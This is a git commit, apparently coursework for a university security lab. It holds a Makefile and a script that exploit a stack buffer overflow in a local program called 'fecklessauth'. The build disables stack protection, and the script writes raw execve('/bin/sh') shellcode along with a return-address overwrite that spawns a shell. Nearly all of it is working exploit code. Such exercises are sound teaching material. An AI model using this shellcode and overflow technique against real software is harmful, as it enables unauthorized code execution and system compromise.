7764c4c8d00a3aa02305ef089b9fbb11513fa8ce
Edo Roth <edoroth@spec08.seas.upenn.edu>
2017-10-02 20:26:09 -0400

    Working script to spawn a shell from overflowing buffer in fecklessauth

--- Makefile
+++ Makefile
@@ -1,7 +1,14 @@
-all: main modified
+all: main modified shellcode
 
 modified: feckModified.c
-	gcc -o modified feckModified.c
+	gcc -g -zexecstack -fno-stack-protector -o modified feckModified.c
 
-main: feckless.c
-	gcc -g feckless.c
+shellocde: shellcode.o
+	ld shellcode.o -o shellcode
+
+shellcode.o: shellcode.s
+	as shellcode.s -o shellcode.o
+
+main: fecklessauth.c 
+	gcc -g -zexecstack -fno-stack-protector fecklessauth.c
+
--- part5WithoutGdb.sh
+++ part5WithoutGdb.sh
@@ -8,23 +8,20 @@ MSGADDRESS=`cat msg.txt`
 EXE=`cat myShellCode.txt`
 
 #Converts to proper hex and uses to format attack string
-#MESSAGEHEX=`python newConvert.py $ADDRESS`
 SHELLHEX=`python add3AndConvert.py $PASSADDRESS`
 PASSHEX=`python newConvert.py $PASSADDRESS`
 MSGHEX=`python newConvert.py $MSGADDRESS`
 
-#Store /bin/sh/ in the message and leave a blank user 
+#Store /bin/sh/ in the message and leave a blank user input 
 echo -ne "/bin/sh\0\n\n\0\0\0" > part5NoGdbinput.txt
 
-#Place shellcode into password
-#cat myShellCode.txt >> part5input.txt
-#python -c "print '\x48\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc7\x80\x10\x60\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05'," >> part5NoGdbinput.txt
-
+#Place shellcode into password buffer
+#(This code comes from running objdump -d myShellCode and manually copying in bytes)
 echo -ne "\x48\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc7\x80\x10\x60\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05" >> part5NoGdbinput.txt
 
 #Continues in buffer - rest of evil, good, ebp, and return value (pointing to shell)
-echo -ne "EVILLLL$MSGHEX\0\0\0\0\0$PASSHEX\0\0$SHELLHEX\0\0" >> part5NoGdbinput.txt 
+echo -ne "EVILLLL$MSGHEX\0\0\0\0\0$PASSHEX\0\0$SHELLHEX\0\0\n" >> part5NoGdbinput.txt 
 
-#Runs executable with proper string
-#./a.out < part5input.txt
+#Command to run executable with proper string
+cat part5NoGdbinput.txt - | ./a.out 
 
